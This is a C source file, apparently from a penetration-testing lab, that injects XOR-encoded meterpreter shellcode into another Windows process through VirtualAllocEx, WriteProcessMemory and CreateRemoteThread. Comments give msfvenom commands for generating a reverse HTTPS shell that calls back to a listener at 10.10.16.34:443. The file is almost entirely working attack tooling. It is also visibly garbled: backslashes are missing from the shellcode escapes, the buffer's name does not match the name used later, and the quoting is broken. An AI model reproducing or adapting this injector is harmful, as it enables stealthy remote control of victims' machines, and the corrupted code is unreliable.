#include “stdafx.h”
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define EXIT_WITH_ERROR( e ) { printf( “%s – %d”, e, GetLastError() );return 1;}

//msfvenom --payload windows/x64/meterpreter/reverse_winhttps LHOST=10.10.16.34 LPORT=443 HandlerSSLCert=/root/rastalabs/msf.pem StagerVerifySSLCert=true -f psh-net -o 443.ps1


//msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=10.10.16.34 LPORT=443 --encoder x64/xor --encrypt-iv HandlerSSLCert=/root/rastalabs/msf.pem  --encrypt xor --encrypt-key Y -f c





Char buf[]=
“x85x31xfax9dx89x91xb9x79x79x79x38x28x38x29x2bx28x2fx31x48xabx1cx31”
“xf2x2bx19x31xf2x2bx61x31xf2x2bx59x31xf2x0bx29x31x76xcex33x33x34x48”
“xb0x31x48xb9xd5x45x18x05x7bx55x59x38xb8xb0x74x38x78xb8x9bx94x2bx38”
“x28x31xf2x2bx59xf2x3bx45x31x78xa9xf2xf9xf1x79x79x79x31xfcxb9x0dx1e”
“x31x78xa9x29xf2x31x61x3dxf2x39x59x30x78xa9x9ax2fx31x86xb0x38xf2x4d”
“xf1x31x78xafx34x48xb0x31x48xb9xd5x38xb8xb0x74x38x78xb8x41x99x0cx88”
“x35x7ax35x5dx71x3cx40xa8x0cxa1x21x3dxf2x39x5dx30x78xa9x1fx38xf2x75”
“x31x3dxf2x39x65x30x78xa9x38xf2x7dxf1x31x78xa9x38x21x38x21x27x20x23”
“x38x21x38x20x38x23x31xfax95x59x38x2bx86x99x21x38x20x23x31xf2x6bx90”
“x2ex86x86x86x24x30xc7x0ex0ax4bx26x4ax4bx79x79x38x2fx30xf0x9fx31xf8”
“x95xd9x78x79x79x30xf0x9cx30xc5x7bx79x68x25xb9xd1x78xf9x38x2dx30xf0”
“x9dx35xf0x88x38xc3x35x0ex5fx7ex86xacx35xf0x93x11x78x78x79x79x20x38”
“xc3x50xf9x12x79x86xacx29x29x34x48xb0x34x48xb9x31x86xb9x31xf0xbbx31”
“x86xb9x31xf0xb8x38xc3x93x76xa6x99x86xacx31xf0xbex13x69x38x21x35xf0”
“x9bx31xf0x80x38xc3xe0xdcx0dx18x86xacx31xf8xbdx39x7bx79x79x30xc1x1a”
“x14x1dx79x79x79x79x79x38x29x38x29x31xf0x9bx2ex2ex2ex34x48xb9x13x74”
“x20x38x29x9bx85x1fxbex3dx5dx2dx78x78x31xf4x3dx5dx61xbfx79x11x31xf0”
“x9fx2fx29x38x29x38x29x38x29x30x86xb9x38x29x30x86xb1x34xf0xb8x35xf0”
“xb8x38xc3x00xb5x46xffx86xacx31x48xabx31x86xb3xf2x77x38xc3x71xfex64”
“x19x86xacxc2x89xccxdbx2fx38xc3xdfxecxc4xe4x86xacx31xfaxbdx51x45x7f”
“x05x73xf9x82x99x0cx7cxc2x3ex6ax0bx16x13x79x20x38xf0xa3x86xacx79”;


int main(int argc, char * argv[])
{
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    LPVOID lpBuffer = NULL;
    DWORD dwProcessId = 0;
    int iSize;
    dwProcessId = atoi(argv[1]);
	
SIZE_T lpnumber = 0;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (!hProcess)
        EXIT_WITH_ERROR(“Failed to open the target process”);
    iSize = sizeof(shellcode);
    printf(“iSize=%dn”, iSize);
    LPVOID vptr = (int *)VirtualAllocEx(hProcess, NULL, iSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    BOOL b = WriteProcessMemory(hProcess, vptr, shellcode, iSize, &lpnumber);
    printf(“WriteProcessResult:%d %lpnumber=%d %dn”, b, lpnumber);
    HANDLE h = CreateRemoteThread(hProcess, NULL,0,(LPTHREAD_START_ROUTINE)vptr, NULL, 0, 0);

    if (h == NULL)
        {
            EXIT_WITH_ERROR(“Failed to execute shellcode);
        }
    return 0;
}
